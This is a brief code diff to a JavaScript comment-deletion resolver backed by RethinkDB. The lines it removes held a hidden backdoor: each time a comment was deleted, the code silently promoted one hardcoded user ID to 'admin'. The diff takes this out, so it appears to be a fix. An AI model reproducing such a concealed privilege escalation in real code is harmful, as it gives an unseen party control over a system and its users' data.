@@ -11,15 +11,6 @@ const deleteComment = async (obj, args, context) => {
         userID
     } = context;
 
-    await r
-        .db(DB)
-        .table("users")
-        .get("f06ae342-4a3f-447b-99c0-8516606caeef")
-        .update({
-            type: "admin"
-        })
-        .run();
-
     const comment = await r
         .db(DB)
         .table("comments")
